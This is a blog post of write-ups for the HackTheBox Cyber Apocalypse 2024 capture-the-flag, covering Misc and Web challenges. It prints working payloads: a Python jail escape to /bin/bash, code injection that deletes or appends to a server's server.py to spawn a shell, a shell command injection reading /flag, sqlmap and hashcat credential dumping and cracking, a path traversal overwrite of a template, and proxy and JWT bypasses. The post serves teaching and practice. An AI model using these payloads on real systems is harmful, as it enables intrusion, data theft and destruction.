---
title: "HackTheBox - Cyber Apocalypse: 2024"
date: 2024-03-16T13:16:33-05:00
categories: ["CTF"]
tags: ["Misc","Web","Forensics"]
description: "HTB Cyber Apocalypse was my favorite CTF competition of 2023, and once again it did not disappoint! I had a blast, and the Forensics category is quickly becoming my new favorite. Our team placed 120th place, 2 positions lower from last year, but overall I felt we had a great showing! The competition was notably stronger than last year, and placing in the top ~3% is still quite great."
image: "ca-2024-ctf-background.jpg"
---
## Misc
### Character
Difficulty: Very Easy
>Security through Induced Boredom is a personal favourite approach of mine. Not as exciting as something like The Fray, but I love making it as tedious as possible to see my secrets, so you can only get one character at a time!
--------------
When we use `nc` to connect to the service, we are asked for an index input. Providing a number prints out 1 character of the flag:
```
$ nc 94.237.62.83 59504
Which character (index) of the flag do you want? Enter an index: 0
Character at Index 0: H
Which character (index) of the flag do you want? Enter an index: 1
Character at Index 1: T
Which character (index) of the flag do you want? Enter an index: 90
Character at Index 90: _
Which character (index) of the flag do you want? Enter an index: 111
Index out of range!
```
As we can see, the flag is really long. I determine the last index to be 103, meaning it is 104 characters long! Retrieving the flag by hand will be extremely tedious, so I use a python script to retrieve the letters and assemble them:
```python
#!/usr/bin/env python3

from pwn import *

p = remote('94.237.62.83', 59504)
flagchars = []
flagindex = 0
flagend = 104

#Start game 1 and chain

for i in range(flagindex, flagend):
    p.sendlineafter("Enter an index: ", str(flagindex))
    p.recvuntil(": ")
    flagchars.append(p.recvS(1))
    flagindex += 1
    print(flagchars[i])
print(''.join(flagchars))
```
The process is very simple: we wait for the server to respond back after connecting ("Enter an index: "), then we send our flag index location beginning 0. We receive a character at index X, and separate it with the ": " text immediately prior to our character. recvS(1) to pick up the letter and append it to our list of chars. Increase index to move on to the next letter, and after the for loop is complete then we print the full character list:
```
$ python3 ans.py 
[+] Opening connection to 94.237.62.83 on port 59504: Done
H
T
B
<...SNIP...>
HTB{tH15_1s_4_r3aLly_l0nG_fL4g_i_h0p3_f0r_y0Ur_s4k3_tH4t_y0U_sCr1pTEd_tH1s_oR_els3_iT_t0oK_qU1t3_l0ng!!}
[*] Closed connection to 94.237.62.83 port 59504
```
Printing the characters as I received them made the output very long and ugly, but we retrieve the flag!

### Unbreakable
Difficulty: Easy
>Think you can escape my grasp? Challenge accepted! I dare you to try and break free, but beware, it won't be easy. I'm ready for whatever tricks you have up your sleeve!
-----------------
The challenge consists of a python file:
```python
#!/usr/bin/python3
<...SNIP...>
blacklist = [ ';', '"', 'os', '_', '\\', '/', '`',
              ' ', '-', '!', '[', ']', '*', 'import',
              'eval', 'banner', 'echo', 'cat', '%', 
              '&', '>', '<', '+', '1', '2', '3', '4',
              '5', '6', '7', '8', '9', '0', 'b', 's', 
              'lower', 'upper', 'system', '}', '{' ]

while True:
  ans = input('Break me, shake me!\n\n$ ').strip()
  
  if any(char in ans for char in blacklist):
    print(f'\n{banner1}\nNaughty naughty..\n')
  else:
    try:
      eval(ans + '()')
      print('WHAT WAS THAT?!\n')
    except:
      print(f"\n{banner2}\nI'm UNBREAKABLE!\n")
      
```
For brevity, I snipped out the ASCII art. This is clearly a python jail exercise, with a somewhat thorough blacklist. The list is missing a very important function in `exec`, but I also notice that `input` is excluded as well. Oftentimes, we can bypass blacklist checks by sending input(), then the content will be treated as stdin. By combining these, I can create a shell session:
```
I'm UNBREAKABLE!

Break me, shake me!

$ exec(input())
import os; os.system("/bin/bash");

id
uid=65534(nobody) gid=65534(nogroup) groups=65534(nogroup)
ls
flag.txt
main.py
cat flag.txt
HTB{3v4l_0r_3vuln??}
```

After performing exec(input()), we supply our jail escape command: `import os; os.system("/bin/bash")`. After pressing enter, we have an interactive shell! I confirm this with `id`, before printing the flag.

### MultiDigilingual
Difficulty: Hard
>It's a known secret that each faction speaks different languages, however few can speak all of them. KORP has long wanted to send a spy in the factions to keep an eye on them. Through their extensive network, they have found different talented factionless to test. The first to show their multidigilingual skills will get a place in them, and be their secret agent amongst the factions. Can you show them your worth?
-----------------
This was a tough nut to crack, but I had a very satisfying unintended solution to it. We are provided no source code, only an instanced address/port:
```
$ nc 94.237.56.46 39938
****************************************
*   How many languages can you talk?   *
* Pass a base64-encoded program that's *
*   all of the below that just reads   *
*      the file `flag.txt` to win      *
*          and pass the test.          *
*                                      *
*              Languages:              *
*               * Python3              *
*               * Perl                 *
*               * Ruby                 *
*               * PHP8                 *
*               * C                    *
*               * C++                  *
*                                      *
*   Succeed in this and you will be    *
*               rewarded!              *
****************************************

Enter the program of many languages:
```
We can see the challenge here: we are to provide a code block in base64 format that will be accepted in all languages and output the contents of flag.txt. After submitting something, we see that it is checking python execution before moving on to perl, likely down the list of languages presented:
```
Enter the program of many languages: aW1wb3J0IG9zCm9zLnN5c3RlbSgnY2F0IGZsYWcudHh0Jyk=

[*] Executing Python3 using command python
    [+] Completed. Checking output
    [+] Passed the check


[*] Executing Perl using command perl
    [+] Completed. Checking output
    [+] Passed the check


[*] Executing Ruby using command ruby
    [+] Completed. Checking output
    [-] Failed to pass test. You are not worthy enough...
```
To learn more about the code execution and checking, I test a variety of factors. For example, a sleep command will hang the check, but will still succeed after sleeping. I can do other interesting things like copy the flag to a new file (asdf.asdf), and cat this new file. Still acceptable. It is quite clear that what we are doing is really being executed by the system, which is important if we want to abuse code injection.

Next, I thought if I can send a web request to a webhook site, I can append the flag to this and ezpz. Except, all efforts failed. Both `wget` and `curl` seem to be missing, and there is an interesting behavior that importing requests into python will suddenly and always fail the python flag check. I even tried to reconstruct curl by supplying base64 encoded version of the binary over several execution sessions. All failure. Eventually, I start dabbling in more destructive tests, and I learned you can break the service by sending `rm *`. It gave me a hunch, and I learned that by deleting a certain `.py` file, the instance bricks. 
```
Enter the program of many languages: aW1wb3J0IG9zCm9zLnN5c3RlbSgncm0gKi5weScp

[*] Executing Python3 using command python
    [+] Completed. Checking output
    [-] Failed to pass test. You are not worthy enough...
^C
$ nc 94.237.56.46 39938


```
Here I use `rm *.py` to destroy all python files. There is no response from the server now, and we have to reset the instance. Perhaps if we can identify the name of the file, we can insert our own code to run?? To figure it out, I was prepared to go through the long and arduous process of running through every alphabet character numerous times in order to squeeze out the obfuscated naming methods used to label this file. Fortunately as soon as I hit `s*.py`, I had a good idea that it was probably just named `server.py`, and it indeed was. Next is to inject our code. First I do a simple injection of invoking os.system to cat the flag:
```
import os
os.system('echo "import os\nos.system(\'cat flag.txt\')" >> server.py')
```
The code in action:
```
Enter the program of many languages: aW1wb3J0IG9zCm9zLnN5c3RlbSgnZWNobyAiaW1wb3J0IG9zXG5vcy5zeXN0ZW0oXCdjYXQgZmxhZy50eHRcJykiID4+IHNlcnZlci5weScp

[*] Executing Python3 using command python
    [+] Completed. Checking output
    [-] Failed to pass test. You are not worthy enough...
^C
$ nc 94.237.62.54 33599
<...SNIP...>
    [-] Failed to pass test. You are not worthy enough...
HTB{7he_ComMOn_5yM8OL5_Of_l4n9U49E5_C4n_LE4d_7O_m4ny_PolY9lO7_WoNdeR5}
```
We inject and then have to create a new session, but once the code checking is finished, our flag is printed out at the end!
On revisiting this a bit later, I decided to insert a full-blown shell session by invoking /bin/bash:
```
import os
os.system('echo "import os\nos.system(\'/bin/bash -i\')" >> server.py')
```
Executing:
```
Enter the program of many languages: aW1wb3J0IG9zCm9zLnN5c3RlbSgnZWNobyAiaW1wb3J0IG9zXG5vcy5zeXN0ZW0oXCcvYmluL2Jhc2ggLWlcJykiID4+IHNlcnZlci5weScp

[*] Executing Python3 using command python
    [+] Completed. Checking output
    [-] Failed to pass test. You are not worthy enough...
<...SNIP...>
    [-] Failed to pass test. You are not worthy enough...
id
uid=65534(nobody) gid=65534(nogroup) groups=65534(nogroup)
ls
flag.txt
poly_code
server.py
cat flag.txt
HTB{7he_ComMOn_5yM8OL5_Of_l4n9U49E5_C4n_LE4d_7O_m4ny_PolY9lO7_WoNdeR5}
```
Now we can take a look at the source code, and it's pretty interesting.
The whole source code was released after the event by HackTheBox [here](https://github.com/hackthebox/cyber-apocalypse-2024/blob/main/misc/%5BHard%5D%20MultiDigilingual/challenge/server.py), but I like that the creator was kind enough to provide a working POC payload within the source code, as if rewarding me for my bad behavior:
```
Iy8qPD9waHAgc3lzdGVtKCdjYXQgZmxhZy50eHQ7Jyk7IF9faGFsdF9jb21waWxlcigpOz8+ICovCiNpZiAwCnByaW50KCgoImIiICsgIjAiID09IDAgYW5kIGV4ZWMoImNhdCBmbGFnLnR4dCIpKSBvciAoMCBhbmQgZXhlYygiY2F0IGZsYWcudHh0Iikgb3IgZXZhbCgnX19pbXBvcnRfXygic3lzIikuc3Rkb3V0LndyaXRlKG9wZW4oImZsYWcudHh0IikucmVhZCgpKScpKSkpOwojZW5kaWYKX19hc21fXygiLnNlY3Rpb24gLnRleHRcbi5nbG9ibCBtYWluXG5tYWluOlxubW92ICQweDAwMDAwMDAwMDAwMDAwMDAsICVyYXhcbnB1c2ggJXJheFxubW92ICQweDc0Nzg3NDJlNjc2MTZjNjYsICVyYXhcbnB1c2ggJXJheFxubW92ICVyc3AsICVyZGlcbnhvciAlcnNpLCAlcnNpXG5tb3YgJDIsICVyYXhcbnN5c2NhbGxcbm1vdiAlcmF4LCAlcmRpXG5tb3YgJXJzcCwgJXJzaVxubW92ICQweDEwMCwgJXJkeFxueG9yICVyYXgsICVyYXhcbnN5c2NhbGxcbm1vdiAkMSwgJXJkaVxubW92ICVyc3AsICVyc2lcbm1vdiAlcmF4LCAlcmR4XG5tb3YgJDEsICVyYXhcbnN5c2NhbGxcbnhvciAlcmRpLCAlcmRpXG5tb3YgJDYwLCAlcmF4XG5zeXNjYWxsXG4iKTsK
```
Translated version:
```
#/*<?php system('cat flag.txt;'); __halt_compiler();?> */
#if 0
print((("b" + "0" == 0 and exec("cat flag.txt")) or (0 and exec("cat flag.txt") or eval('__import__("sys").stdout.write(open("flag.txt").read())'))));
#endif
__asm__(".section .text\n.globl main\nmain:\nmov $0x0000000000000000, %rax\npush %rax\nmov $0x7478742e67616c66, %rax\npush %rax\nmov %rsp, %rdi\nxor %rsi, %rsi\nmov $2, %rax\nsyscall\nmov %rax, %rdi\nmov %rsp, %rsi\nmov $0x100, %rdx\nxor %rax, %rax\nsyscall\nmov $1, %rdi\nmov %rsp, %rsi\nmov %rax, %rdx\nmov $1, %rax\nsyscall\nxor %rdi, %rdi\nmov $60, %rax\nsyscall\n");

```
As an ending note, `curl` and `wget` were confirmed missing via the bash session.
## Web
### TimeKORP
Difficulty: Very Easy
>Are you ready to unravel the mysteries and expose the truth hidden within KROP's digital domain? Join the challenge and prove your prowess in the world of cybersecurity. Remember, time is money, but in this case, the rewards may be far greater than you imagine.
--------------
Within the source code, we can begin by looking at what/where we can supply custom input. In general, controllers and routes are most interesting, as controllers usually handle the back-end behaviors and routes will detail what endpoints exist in the web service. In the controller file TimeController.php:

```php
<?php
class TimeController
{
    public function index($router)
    {
        $format = isset($_GET['format']) ? $_GET['format'] : '%H:%M:%S';
        $time = new TimeModel($format);
        return $router->view('index', ['time' => $time->getTime()]);
    }
}
```
We can see in a GET request, this server is taking a parameter `format`, and calls TimeModel. Within TimeModel, we can see how format is used. Remember that this is a field supplied by us, after the URL parameter:
```php
<?php
class TimeModel
{
    public function __construct($format)
    {
        $this->command = "date '+" . $format . "' 2>&1";
    }

    public function getTime()
    {
        $time = exec($this->command);
        $res  = isset($time) ? $time : '?';
        return $res;
    }
}
```
Format is inserted  directly into `command` then later used as `exec`. Without sanitizing, this leads to a command injection vulnerability. Our argument will be surrounded by single quotes, so as long as we supply a quote to escape, we can input shell commands:
`'; id;'`  as an example payload. In this command, I escape the wrapped quotes by supplying `'`, and end the date command with `;`. I run `id`, and finish by ending in a single quote so that our command won't have syntax errors from the quote mark following our injection. Running the command on the webpage:

![](images/timekorpid.png)

We see the command injection works! Now to simply cat the flag. The source code provides a sample flag in the base directory, so we should first check as `/flag`:

```
http://94.237.58.155:43833/?format=';cat /flag'
```

![](images/timekorpflag.png)
Note that the file didn't have a `.txt` extension, so we don't include it either. A bit of a weird choice, but whatever.
`HTB{t1m3_f0r_th3_ult1m4t3_pwn4g3}`



### KORP Terminal
Difficulty: Very Easy
>Your faction must infiltrate the KORP™ terminal and gain access to the Legionaries' privileged information and find out more about the organizers of the Fray. The terminal login screen is protected by state-of-the-art encryption and security protocols.
---------------------
We don't receive source code, so we have to go in blind. Landing in the website, we are immediately greeted with a login page:
![](images/login.png)

Basic credentials like admin:admin aren't working for me, so we need to look at circumventing. Since is this categorized as a very easy, I have strong suspicion that this is an SQL injection type problem. Eventually I find an error that shows I'm correct. By supplying a UNION injection with incorrect column numbers, it tells me so:
```
admin'UNION SELECT 1,2-- -
```
![](images/sqlerror.png)

It is SQL injection, but I ended up having a lot of trouble getting any payload to work.. I ended up using SQLMap:
```
┌──(kali㉿kali)-[~]
└─$ sqlmap http://83.136.254.16:49302/ --data "username=admin&password=password" --batch --ignore-code 401 --dump
        ___
       __H__
 ___ ___["]_____ ___ ___  {1.7.12#stable}
|_ -| . [']     | .'| . |
|___|_  [']_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org                                                                                                                                                                                               
<...SNIP...>
Table: users
[1 entry]
+----+--------------------------------------------------------------+----------+
| id | password                                                     | username |
+----+--------------------------------------------------------------+----------+
| 1  | $2b$12$OF1QqLVkMFUwJrl1J1YG9u6FdAQZa6ByxFt/CkS/2HW8GA563yiv. | admin    |
+----+--------------------------------------------------------------+----------+
```

Using hashcat to crack:
```
$ hashcat -m 3200 '$2b$12$OF1QqLVkMFUwJrl1J1YG9u6FdAQZa6ByxFt/CkS/2HW8GA563yiv.' /usr/share/wordlists/rockyou.txt 
hashcat (v6.2.5) starting
<...SNIP...>

$2b$12$OF1QqLVkMFUwJrl1J1YG9u6FdAQZa6ByxFt/CkS/2HW8GA563yiv.:password123
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 3200 (bcrypt $2*$, Blowfish (Unix))
Hash.Target......: $2b$12$OF1QqLVkMFUwJrl1J1YG9u6FdAQZa6ByxFt/CkS/2HW8...63yiv.
Time.Started.....: Sat Mar  9 11:38:16 2024 (31 secs)
Time.Estimated...: Sat Mar  9 11:38:47 2024 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:       45 H/s (7.76ms) @ Accel:16 Loops:8 Thr:11 Vec:1
Recovered........: 1/1 (100.00%) Digests
Progress.........: 1408/14344384 (0.01%)
Rejected.........: 0/1408 (0.00%)
Restore.Point....: 1232/14344384 (0.01%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:4088-4096
Candidate.Engine.: Device Generator
Candidates.#1....: pedro -> tagged
Hardware.Mon.#1..: Temp: 63c Fan: 36% Util:100% Core:1316MHz Mem:3004MHz Bus:4

Started: Sat Mar  9 11:38:10 2024
Stopped: Sat Mar  9 11:38:48 2024
```
The password is `password123`; simple enough to brute force guess if you're lucky. It's hard to say what was actually intended with this, as sqlmap utilized blind boolean injection which is definitely a tier above `Very Easy` to do manually. When we log in, the flag is right there:

![](images/sqlflag.png)
`HTB{t3rm1n4l_cr4ck1ng_sh3n4nig4n5}`

### Flag Command
Difficulty: Very Easy
>Embark on the "Dimensional Escape Quest" where you wake up in a mysterious forest maze that's not quite of this world. Navigate singing squirrels, mischievous nymphs, and grumpy wizards in a whimsical labyrinth that may lead to otherworldly surprises. Will you conquer the enchanted maze or find yourself lost in a different dimension of magical challenges? The journey unfolds in this mystical escape!
---------------
There is no source code for this challenge. When we enter, we are greeted with this unpleasant green font and an input prompt:

![](images/flagcommand1.png)
When we peek at the web view-source code, we can see that the service seems to largely run on static javascript:
```html
<script src="[/static/terminal/js/commands.js](view-source:http://94.237.50.51:55966/static/terminal/js/commands.js)" type="module"></script>
  <script src="[/static/terminal/js/main.js](view-source:http://94.237.50.51:55966/static/terminal/js/main.js)" type="module"></script>
  <script src="[/static/terminal/js/game.js](view-source:http://94.237.50.51:55966/static/terminal/js/game.js)" type="module"></script>
```
`commands.js` ends up being largely uninteresting, but when we look at `main.js` we can find the conditions to achieve certain step numbers:
```js
if (currentCommand == 'HEAD NORTH') {
    currentStep = '2';
}
else if (currentCommand == 'FOLLOW A MYSTERIOUS PATH') {
                currentStep = '3'
}
    else if (currentCommand == 'SET UP CAMP') {
        currentStep = '4'
}

let lineBreak = document.createElement("br");
```
Unfortunately, reaching step4 does not give us the flag, and we might find that none of the answers allow us to progress. If we look in the bottom of `main.js`, we have info on how the program is pulling options:
```js
const fetchOptions = () => {
    fetch('/api/options')
        .then((data) => data.json())
        .then((res) => {
            availableOptions = res.allPossibleCommands;

        })
        .catch(() => {
            availableOptions = undefined;
        })
}
```
We can curl it, and it displays every command option including a 'secret':
```
curl http://83.136.254.167:36204/api/options -H "Content-Type: application/json"
```
```json
{
  "allPossibleCommands": {
    "1": [
      "HEAD NORTH",
      "HEAD WEST",
      "HEAD EAST",
      "HEAD SOUTH"
    ],
    "2": [
      "GO DEEPER INTO THE FOREST",
      "FOLLOW A MYSTERIOUS PATH",
      "CLIMB A TREE",
      "TURN BACK"
    ],
    "3": [
      "EXPLORE A CAVE",
      "CROSS A RICKETY BRIDGE",
      "FOLLOW A GLOWING BUTTERFLY",
      "SET UP CAMP"
    ],
    "4": [
      "ENTER A MAGICAL PORTAL",
      "SWIM ACROSS A MYSTERIOUS LAKE",
      "FOLLOW A SINGING SQUIRREL",
      "BUILD A RAFT AND SAIL DOWNSTREAM"
    ],
    "secret": [
      "Blip-blop, in a pickle with a hiccup! Shmiggity-shmack"
    ]
  }
}
```
Submitting the secret returns the password:
![](images/flagcommand_flag.png)
We can do this in command line as well, directly submitting to /api/monitor:
```
$ curl http://83.136.254.167:36204/api/monitor -H "Content-Type: application/json" -d '{"command":"Blip-blop, in a pickle with a hiccup! Shmiggity-shmack"}'
{
  "message": "HTB{D3v3l0p3r_t00l5_4r3_b35t_wh4t_y0u_Th1nk??!}"
}
```
I suppose it is all for the challenge, but it felt weird to have a `command.js` file that only contains the first set of commands, then retrieving the rest from an off-source location..

### Testimonial
Difficulty: Easy
>As the leader of the Revivalists you are determined to take down the KORP, you and the best of your faction's hackers have set out to deface the official KORP website to send them a message that the revolution is closing in.
---------------------
The web server is written in `Go`, and has a ton of separate files:
```
$ tree
.
├── client
│   └── client.go
├── go.mod
├── go.sum
├── grpc.go
├── handler
│   ├── home.go
│   └── shared.go
├── main.go
├── Makefile
├── pb
│   ├── ptypes_grpc.pb.go
│   ├── ptypes.pb.go
│   └── ptypes.proto
├── public
│   ├── css
│   │   ├── bootstrap.min.css
│   │   └── main.css
│   ├── js
│   │   └── bootstrap.min.js
│   └── testimonials
│       ├── 1.txt
│       ├── 2.txt
│       └── 3.txt
├── tmp
│   └── build-errors.log
└── view
    ├── home
    │   └── index.templ
    └── layout
        └── app.templ

11 directories, 20 files
```
In essence, this web server has two main components: the front-end index page, and a back-end gRPC client. We can submit testimonies on the main page:

![1, submit asdf testimony. 2, my testimony appears above.](images/submittestimony.png)

When we submit, our name passes through an interesting filter:
```go
func (c *Client) SendTestimonial(customer, testimonial string) error {
        ctx := context.Background()
        // Filter bad characters.
        for _, char := range []string{"/", "\\", ":", "*", "?", "\"", "<", ">", "|", "."} {
                customer = strings.ReplaceAll(customer, char, "")
        }

        _, err := c.SubmitTestimonial(ctx, &pb.TestimonialSubmission{Customer: customer, Testimonial: testimonial})
        return err
}
```

The filter here is submitting our testimony to the gRPC client. There is an easy way to bypass this filter, however, and that is to submit the gRPC requests ourselves! When we launch the instance, we are given two IP:PORT combinations. The first being for the web front-end, and the second is for the gRPC service.

When we look at `grpc.go`, we can see what the testimony submissions are doing:
```go
func (s *server) SubmitTestimonial(ctx context.Context, req *pb.TestimonialSubmission) (*pb.GenericReply, error) {
        if req.Customer == "" {
                return nil, errors.New("Name is required")
        }
        if req.Testimonial == "" {
                return nil, errors.New("Content is required")
        }

        err := os.WriteFile(fmt.Sprintf("public/testimonials/%s", req.Customer), []byte(req.Testimonial), 0644)
        if err != nil {
                return nil, err
        }

        return &pb.GenericReply{Message: "Testimonial submitted successfully"}, nil
}
```
It is using our submitted name (Customer parameter) as the file to write! Since we can control this, we can escape the directory and perform directory traversal. This is why the previous bad character list was in place, but as mentioned we can bypass this by submitting to gRPC ourselves. For this, I used [Postman](https://www.postman.com/), although clever people might be able to get it working with [grpcli](https://github.com/nathangoulding/grpcli) or something else.

For Postman, we can specify gRPC requests:

![](images/postman1.png)

We select our URL, and since this gRPC client doesn't have server reflection, we must upload the `ptypes.proto` from the challenge zip:

![Selecting Import a .proto, go to the ptypes.proto location](images/postmanimport.png)

`SubmitTestimonial` is the only protocol that exists, so this is an easy choice. Example message can quickly generate the proper format for us:

![](images/postman2.png)

Then you can submit a response, and get an error about http in your address.. I even had the wrong IP:PORT. But when it's fixed, you get a successfully submitted:

![](images/postman3.png)

Now lorem ipsum appears:

![](images/loremipsum.png)

We can also view the testimonials directory ourselves, but it is interesting as no matter what we try, we cannot write or overwrite the files in this location:

![](images/testimonials.png)

What's even more interesting, is we can submit a new 1.txt to overwrite, and the main page will overwrite the content. However, if we visit the `1.txt` in this location, the content does not change. My guess is that this is the nature of a go-generated web server. These directories are created at launch, and are now static?

Through trial and error, we might find that we can overwrite the index template located at `challenge/view/home/index.templ`. This is where the front-end page is being called, and writing over it completely bricks the web service. Thus, I have an idea: what if we edit this template directly, and have it pull submissions from the root directory instead of public/testimonials? Genius, I say. It took a lot of effort to format the page in a way that Postman would accept, but I eventually get it:

![](images/postman4.png)

Alterations that needed to be done:
- Replace hard returns with `\n` for newline.
- Escape all double quotes, and no, replacing to single quotes does not work.
- Remove all tab indentations
The edit to the index code was done here:
```go
func GetTestimonials() []string {
        fsys := os.DirFS("/")
        files, err := fs.ReadDir(fsys, ".")
        if err != nil {
                return []string{fmt.Sprintf("Error reading testimonials: %v", err)}
        }
        var res []string
        for _, file := range files {
                fileContent, _ := fs.ReadFile(fsys, file.Name())
                res = append(res, string(fileContent))
        }
        return res
}

```
What was once `os.DirFS("public/testimonials")`  is now this. 
Full request:
```json
{

"customer": "../../../../../challenge/view/home/index.templ",

"testimonial": "package home\n\nimport (\n \"htbchal/view/layout\"\n \"io/fs\" \n \"fmt\"\n \"os\"\n)\n\ntempl Index() {\n @layout.App(true) {\n<nav class=\"navbar navbar-expand-lg navbar-dark bg-black\">\n <div class=\"container-fluid\">\n <a class=\"navbar-brand\" href=\"/\">The Fray</a>\n <button class=\"navbar-toggler\" type=\"button\" data-toggle=\"collapse\" data-target=\"#navbarNav\"\n aria-controls=\"navbarNav\" aria-expanded=\"false\" aria-label=\"Toggle navigation\">\n <span class=\"navbar-toggler-icon\"></span>\n </button>\n <div class=\"collapse navbar-collapse\" id=\"navbarNav\">\n <ul class=\"navbar-nav ml-auto\">\n <li class=\"nav-item active\">\n <a class=\"nav-link\" href=\"/\">Home</a>\n </li>\n <li class=\"nav-item\">\n <a class=\"nav-link\" href=\"javascript:void();\">Factions</a>\n </li>\n <li class=\"nav-item\">\n <a class=\"nav-link\" href=\"javascript:void();\">Trials</a>\n </li>\n <li class=\"nav-item\">\n <a class=\"nav-link\" href=\"javascript:void();\">Contact</a>\n </li>\n </ul>\n </div>\n </div>\n</nav>\n\n<div class=\"container\">\n <section class=\"jumbotron text-center\">\n <div class=\"container mt-5\">\n <h1 class=\"display-4\">Welcome to The Fray</h1>\n <p class=\"lead\">Assemble your faction and prove you\"re the last one standing!</p>\n <a href=\"javascript:void();\" class=\"btn btn-primary btn-lg\">Get Started</a>\n </div>\n </section>\n\n <section class=\"container mt-5\">\n <h2 class=\"text-center mb-4\">What Others Say</h2>\n <div class=\"row\">\n @Testimonials()\n </div>\n </section>\n\n\n <div class=\"row mt-5 mb-5\">\n <div class=\"col-md\">\n <h2 class=\"text-center mb-4\">Submit Your Testimonial</h2>\n <form method=\"get\" action=\"/\">\n <div class=\"form-group\">\n <label class=\"mt-2\" for=\"testimonialText\">Your Testimonial</label>\n <textarea class=\"form-control mt-2\" id=\"testimonialText\" rows=\"3\" name=\"testimonial\"></textarea>\n </div>\n <div class=\"form-group\">\n <label class=\"mt-2\" for=\"testifierName\">Your Name</label>\n <input type=\"text\" class=\"form-control mt-2\" id=\"testifierName\" name=\"customer\"/>\n </div>\n <button type=\"submit\" class=\"btn btn-primary mt-4\">Submit Testimonial</button>\n </form>\n </div>\n </div>\n</div>\n\n<footer class=\"bg-black text-white text-center py-3\">\n <p>&copy; 2024 The Fray. All Rights Reserved.</p>\n</footer>\n }\n}\n\nfunc GetTestimonials() []string {\n fsys := os.DirFS(\"/\") \n files, err := fs.ReadDir(fsys, \".\") \n if err != nil {\n return []string{fmt.Sprintf(\"Error reading testimonials: %v\", err)}\n }\n var res []string\n for _, file := range files {\n fileContent, _ := fs.ReadFile(fsys, file.Name())\n res = append(res, string(fileContent)) \n }\n return res\n}\n\ntempl Testimonials() {\n for _, item := range GetTestimonials() {\n <div class=\"col-md-4\">\n <div class=\"card mb-4\">\n <div class=\"card-body\">\n <p class=\"card-text\">\"{item}\"</p>\n <p class=\"text-muted\">- Anonymous Testifier</p>\n </div>\n </div>\n </div>\n }\n}\n"

}
```

Now finally, when we return to the page, the flag is indeed accessed!

![](images/TestimonyFlag.png)
`HTB{w34kly_t35t3d_t3mplate5}`



### LockTalk
Difficulty: Medium
>In "The Ransomware Dystopia," LockTalk emerges as a beacon of resistance against the rampant chaos inflicted by ransomware groups. In a world plunged into turmoil by malicious cyber threats, LockTalk stands as a formidable force, dedicated to protecting society from the insidious grip of ransomware. Chosen participants, tasked with representing their districts, navigate a perilous landscape fraught with ethical quandaries and treacherous challenges orchestrated by LockTalk. Their journey intertwines with the organization's mission to neutralize ransomware threats and restore order to a fractured world. As players confront internal struggles and external adversaries, their decisions shape the fate of not only themselves but also their fellow citizens, driving them to unravel the mysteries surrounding LockTalk and choose between succumbing to despair or standing resilient against the encroaching darkness.
----------------
The first interesting section for this challenge is actually in `conf/haproxy.cfg`. The conf folder usually has nothing interesting, so it could be easy to overlook completely.
```
global
    daemon
    maxconn 256

defaults
    mode http

    timeout connect 5000ms
    timeout client 50000ms
    timeout server 50000ms

frontend haproxy
    bind 0.0.0.0:1337
    default_backend backend

    http-request deny if { path_beg,url_dec -i /api/v1/get_ticket }
    
backend backend
    balance roundrobin
    server s1 0.0.0.0:5000 maxconn 32 check
```
We see the proxy denies http requests if the path starts with `/api/v1/get_ticket`. We will see how this comes into play soon.
Visiting the website, we are shown all the available endpoints:

![](images/tocktalkapi.png)

Getting the flag looks to require a JWT token, and generating a JWT token will result in an error: we are forbidden from visiting, just as defined in the haproxy. However, we have ways around such a restriction. If we were to append something before `api`, it will not be recognized and blocked. Using a simple `.` for cwd, we can request the page without traveling. It no longer begins with `/api/v1/get_ticket`, and so we are able to visit. Most modern browsers will simplify requests and reduce `/./` out, but we can use Burpsuite to do this:

![](images/burpbypass.png)

Alternatively, we can use curl with the `--path-as-is` flag to keep the `/./` in the request:
```
$ curl http://83.136.249.253:46008/./api/v1/get_ticket --path-as-is
{"ticket: ":"eyJhbGciOiJQUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE3MTAxNjI0MjcsImlhdCI6MTcxMDE1ODgyNywianRpIjoiM2h4Q2wyQXJYdUhxOUxJVnQtTXVmQSIsIm5iZiI6MTcxMDE1ODgyNywicm9sZSI6Imd1ZXN0IiwidXNlciI6Imd1ZXN0X3VzZXIifQ.H3vxYVEp-F55Y9jR39ZpJjOBAYgyEReXnovLrDB2tSAFlvW5zifyKnrTF0n29Ck8v_yTmq9w4RgEBoRz4EXZzMeydAK4wVVc9nI3f5p05SG4lRNoVu7b5V0mlLqjjDGDkonyvc7Hveth2WPK0A-0HfjsxbAPHzFy1ZPKXpjHFvOPZXjtUp21JrUtWZlryH77__FCcnTasrGUrj13AhdBWuHXb4xUjDGU_ma-aEbNYW3EO_Uxa16KceP5aHb9ZDmWL4Kjh85Ux82VhX4sqCrVhIx-VhHoif4tDkJ4LF_oDtIm9aOD1x10_qXxZnPtpJMRwU0PeI-Sv02GlvquBHe5WA"}
```

Despite getting a token, guests cannot view flag:

![](images/flagreject.png)

We can use a JWT decoder to decode and alter our JWT token:

![](images/jwt1.png)

The encryption does not allow us to edit easily. Fortunately, we might find a [CVE that highlights a relevant issue](https://github.com/advisories/GHSA-5p8v-58qm-c7fp "https://github.com/advisories/GHSA-5p8v-58qm-c7fp"). We can send a token as JSON format, including forged content, while providing a valid signature for the untampered token. It will be accepted anyways, and we can access. This CVE was resolved in python-jwt version 3.3.4, so we should check what version this service uses. In the requirements.txt file:
```
$ cat conf/requirements.txt  
uwsgi 
Flask 
requests 
python_jwt==3.3.3
```
This is specifically 3.3.3, which means it is very likely the intended method. We can find a POC script for the CVE [here](https://github.com/user0x1337/CVE-2022-39227).

```
